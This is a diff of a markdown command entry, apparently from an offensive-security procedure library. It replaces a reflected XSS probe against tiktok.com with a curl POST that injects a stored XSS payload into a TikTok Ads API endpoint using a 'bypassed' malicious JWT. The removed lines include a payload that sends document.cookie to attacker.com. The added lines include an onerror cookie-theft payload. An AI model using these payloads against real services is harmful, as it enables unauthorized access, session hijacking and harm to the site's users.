@@ -1,22 +1,19 @@
 ---
-id: cmd-inject-xss-payload
 data: >-
-  curl -s
-  "https://www.tiktok.com/?lang=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"
-  | grep -i script
+  curl -X POST -H "Authorization: Bearer $(cat malicious.jwt)" -d
+  'description=<script>alert("XSS via JWT Bypass")</script>'
+  https://ads.tiktok.com/api/submit-ad
 tags:
   - xss
-  - testing
-  - web
+  - injection
 type: command
-output: null
 executor: bash
 platforms:
   - Linux
   - macOS
-  - Web
-created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T03:47:13.136Z'
+id: 2a7ade8a-9e14-4656-8e2c-b11f5abc6676
+created_at: '2025-12-14T17:30:58.259Z'
+updated_at: '2025-12-14T17:30:58.259Z'
 verified: false
 validated: true
 submitted: true
@@ -26,39 +23,40 @@ submitted: true
 ## Command
 
 ```bash
-curl -s "https://www.tiktok.com/?lang=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E" | grep -i script
+curl -X POST -H "Authorization: Bearer $(cat malicious.jwt)" -d 'description=<script>alert("XSS via JWT Bypass")</script>' https://ads.tiktok.com/api/submit-ad
 ```
 
 ## Description
 
-This command tests for reflected XSS by sending a URL-encoded JavaScript payload via the language parameter and checking if the script tag is present in the response, indicating lack of sanitization.
+This curl command injects a stored XSS payload into a TikTok Ads API endpoint using a bypassed JWT for authentication, exploiting lack of input sanitization.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `-s` | Silent mode to suppress progress meter | Yes |
-| URL | Target URL with encoded payload in lang parameter | Yes |
-| `| grep -i script` | Pipe to search for script indicators in output | Yes |
+| `-X POST` | HTTP method | Yes |
+| `-H` | Authorization header with JWT | Yes |
+| `-d` | Payload data with script | Yes |
+| URL | Target endpoint | Yes |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-curl -s "https://www.tiktok.com/?lang=test" | grep "test"
+curl -X POST -d 'title=<script>alert(1)</script>' https://example.com/api
 ```
 
 ### Advanced Usage
 
 ```bash
-curl -s "https://m.tiktok.com/?lang=%3Cscript%3Edocument.location=%27http://attacker.com?%27+document.cookie%3C/script%3E" -v
+curl -X POST -H "Content-Type: application/json" -d '{"desc":"<img src=x onerror=alert(document.cookie)>"}' https://ads.tiktok.com/api
 ```
 
 ## Expected Output
 
-If vulnerable, output includes lines with '<script>' or the payload, e.g., "<script>alert('XSS')</script>". No output or encoded payload indicates sanitization.
+HTTP 201 Created or 200 OK with confirmation, e.g., {"id":123,"status":"submitted"}.
 
 ## Related
 
-- [[Related Procedure: Exploit-Reflected-XSS-in-Language-Parameter]]
+- [[Related Procedure|procedures/Stored-XSS-Injection-via-Bypassed-Access]]
